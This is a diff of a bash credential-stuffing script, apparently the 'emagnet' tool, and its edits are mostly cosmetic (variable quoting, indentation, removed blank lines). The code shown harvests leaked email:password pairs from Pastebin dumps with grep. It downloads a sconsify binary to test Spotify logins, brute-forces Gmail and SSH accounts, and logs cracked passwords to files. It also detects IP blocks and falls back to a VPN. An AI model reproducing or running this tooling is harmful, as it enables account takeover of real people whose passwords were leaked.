@@ -465,7 +465,7 @@ done
 }
 
 countdown() {
-if [[ $GBRUTEFORCE = "true" ]]; then
+if [[ ${GBRUTEFORCE} = "true" ]]; then
     clear
     banner
       conf
@@ -479,8 +479,8 @@ if [[ $GBRUTEFORCE = "true" ]]; then
       printf "%19s \e[1;31m$(echo -e "\e[1;34mG\e[1;31mM\e[1;33mA\e[1;34mi\e[0;32mL\e\e[0m") BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
       printf "\n%64s \n" | tr ' ' '='
       echo
-      analyzer
-elif [[ $PBRUTEFORCE = "true" ]]; then
+    analyzer
+elif [[ ${PBRUTEFORCE} = "true" ]]; then
     clear
     banner
       conf
@@ -495,9 +495,9 @@ elif [[ $PBRUTEFORCE = "true" ]]; then
       printf "\n%64s \n" | tr ' ' '='
       echo
     analyzer
-elif [[ $SBRUTEFORCE = "true" ]]; then
-      clear
-      banner
+elif [[ ${SBRUTEFORCE} = "true" ]]; then
+    clear
+    banner
       conf
       sed -i '118d' $CONF
       sed -i '118 i GBRUTEFORCE=false' $CONF
@@ -509,7 +509,7 @@ elif [[ $SBRUTEFORCE = "true" ]]; then
       printf "%20s \e[1mSSH\e[0m BRUTE MODE is: \e[1;32mON\e[0m\e[0m\n"
       printf "\n%64s \n" | tr ' ' '='
       echo
-      analyzer
+    analyzer
 else
       sed -i '118d' $CONF
       sed -i '118 i GBRUTEFORCE=false' $CONF
@@ -518,25 +518,17 @@ else
       sed -i '120d' $CONF
       sed -i '120 i PBRUTEFORCE=false' $CONF
       conf
-      analyzer
+    analyzer
 fi
 }
 
 blocked() { conf;if [[ ! -s /tmp/.emagnet ]]; then $BROWSER -dump $PASTEBIN > /tmp/.emagnet;fi; }
-
-
-
-
-
-########### BRUTERS
 
 spotifybruter() {
 VERSION="0.6.0"
 WWWSOURCE="https://nr1.nu/archive/sconsify"
 SCONSIFY="${WWWSOURCE}/linux-x86_64-sconsify-${VERSION}.next.zip"
 SPOTIFY_TARGETS="/tmp/.emagnet-passwords"
-
-
 grep -rEiEio "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b:...*" $EMAGNETTEMP \
 |awk '{print $1}' \
 |cut -d: -f2,3 \
@@ -630,7 +622,7 @@ if [[ -z "$attack" ]]; then
     echo -e "[-] $(date +%d/%m/%Y\ -\ %H:%M) -> Wrong Password For $mail $mail: \e[1;31m$password\e[0m" >> $EMAGNETLOGS/failed-to-crack.txt
 fi
 if [[ -n "$attack" ]]; then
-    echo -e  "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
+    echo -e "[+] Password Has Been Cracked $mail: \e[1;32m$password\e[0m"
     read -p "[+] Accounts to crack has been set to 1, emagnet has been killed.\n" hey
     echo -e "================================================================"     >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
     echo -e "[+] Login Details For Gmail - Cracked $(date +%d/%m/%Y\ -\ %H:%M)"    >>    $EMAGNETLOGS/cracked-gmail-passwords.txt
@@ -646,10 +638,8 @@ else
     sleep 1
 fi
 }
-
-
-##### SYNTAX
 emagnetsyntax() {
+  #### CHANGE THIS FOR CURL
 $BROWSER -dump $PASTEBIN/bash|grep -q "blocked your IP"
 if [[ $? = "0" ]]; then
  if [[ $VPN = "true" ]]; then
